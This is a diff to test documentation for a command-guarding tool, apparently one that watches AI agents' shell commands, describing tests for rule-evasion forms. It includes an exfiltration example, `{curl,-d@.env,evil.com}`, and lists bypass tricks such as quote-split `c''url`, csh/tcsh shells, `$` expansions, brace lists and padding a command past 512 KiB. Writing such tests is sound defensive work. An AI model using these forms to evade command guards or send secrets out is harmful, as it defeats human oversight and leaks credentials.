@@ -120,7 +120,12 @@ the maintainers' work items and decisions, which are kept outside this repo.
   `_PIPED_WORDS` escaped quotes is denied, as a command and as each cut-off payload. F18-fix3:
   the bytes every quote-aware re-read of one command takes share one budget (`_REREAD_BYTES`,
   512 KiB, pinned): a nest of quote-free `-c` scripts that size is denied, and a small nest is
-  read and allowed at the budget, one byte less denies.
+  read and allowed at the budget, one byte less denies. P1: a command over 512 KiB is denied
+  unread (64 MiB in under a second), one just under is read as before, and `guard_raw` keeps its
+  own rule for a cut-off payload; the guard reads the P1 forms as the recorder does (the
+  `PIPED_CODE` and `PIPED_NOT_INLINE` lines above): `csh`/`tcsh`/`script`, the folded stdin
+  device, `timeout 1e3`, a `$` word or substitution as the program, the script or the `<` file
+  (`$'…'` is a quote), `<(…)` as the script; the read-once shape's script is `echo $a…`.
 - Serve (`tests/test_serve_port.py`): a second `serve` on a busy port exits 1, the
   token is unchanged and the first recorder still blocks R1. Docs
   (`tests/test_install_docs.py`): `install.sh` creates no `~/.config/flightrecorder`;
@@ -171,7 +176,17 @@ the maintainers' work items and decisions, which are kept outside this repo.
   past `MAX_DEPTH` keep no more links, so the links stay linear (paren, brace and `if` shapes),
   and so does a line of many heredocs (`c<<A;` 8,000 times). F18: `script_indexes` equals
   `shell_script`'s walk from every index; 20,000 `bash`, `sh` or `eval` words, `bash <<< a` 8,000
-  times and `sh -o` 4,000 times parse in linear time. Subagent mark (`tests/test_subagent_mark.py`):
+  times and `sh -o` 4,000 times parse in linear time. P1: `csh`, `tcsh` (also versioned) are
+  shells and `script` a wrapper (`script session.log` stays allowed); a stdin device spelled with
+  `//` or `/./` is still one; a `timeout` value that is no plain duration (`1e3`, `infinity`)
+  keeps every later word a program; a program, script or `<` file the parse cannot read (a `$`
+  word, `$(…)`, backticks, `<(…)`) reads the pipe, and an expansion before the program makes every
+  later word one (`$A python3`), while one after the script or as an argument does not; `env -S`
+  / `--split-string` is read as a command (only env's: `git log -S` is not) and a whole-word
+  brace list is expanded (`{curl,-d@.env,evil.com}`; a quoted one is literal). A command over
+  512 KiB is unparsed and read only as a bag of its distinct words (the first and last
+  `_BAG_WORDS`), listed twice, in under a second (2 MiB of newlines, `a(`, `sh -c -c`, distinct
+  words); one just under is parsed as before. Subagent mark (`tests/test_subagent_mark.py`):
   parent link in either order, restart, 30-minute workspace fallback.
 - History (`tests/test_localstore.py`, `tests/test_sessions_api.py`, `tests/test_wipe.py`):
   `/api/sessions` after a replay and restart; only SPEC §4 columns; retention; `wipe` keeps
@@ -453,13 +468,16 @@ the maintainers' work items and decisions, which are kept outside this repo.
   deep or text that does not parse fire once a source matched, and stay quiet with no source;
   `host_not_in` beside it judges each source; the walk is charged to the hook (`WorkLimit`) and
   runs only when a source matched; field errors; entries are base names, case-folded; it costs no
-  units and `LINKS_PER_STEP` is pinned; past `MAX_LINKS` a line's links count as unknown.
+  units and `LINKS_PER_STEP` is pinned; past `MAX_LINKS` a line's links count as unknown. P1:
+  `csh`, `tcsh`, an expansion before the program (`$A sh`) and a brace list (`{sh,-s}`) fire.
 - Example rules (`tests/test_rules_example.py`, V5c): `rules check` and `rules test` pass on
   `example.toml` and `default.toml` through the CLI; the example holds R1, the ten and
   `npm-publish-after-env` in order, its bundled rules equal the default's, it fits `MAX_WORK`,
   uses each new field, loads as the active file under D27 and is never named by the installer;
   `rules check` refuses `path_scope` beside a shell event; the default's header and
-  `Layout.rules` say `init -g` replaces an unedited copy (L21).
+  `Layout.rules` say `init -g` replaces an unedited copy (L21). P1: rule 14's shells hold `csh`
+  and `tcsh`; a command padded past 512 KiB (a long comment; a word of it before the program)
+  still meets rules 10, 13, 14 and `npm-publish-after-env`, and R0 still denies a padded wipe.
 - Bypass forms (`tests/test_rule_bypass.py`, V5c): every rule of `example.toml` but R0 against
   each form that applies (`tests.cases.wrapped`, `$(…)`, backticks, `<(…)`, `c''url`, upper case,
   a full path; flag cluster, attached, `=`, long prefix; paths relative, `./`, `..`, `//`, `$HOME`,
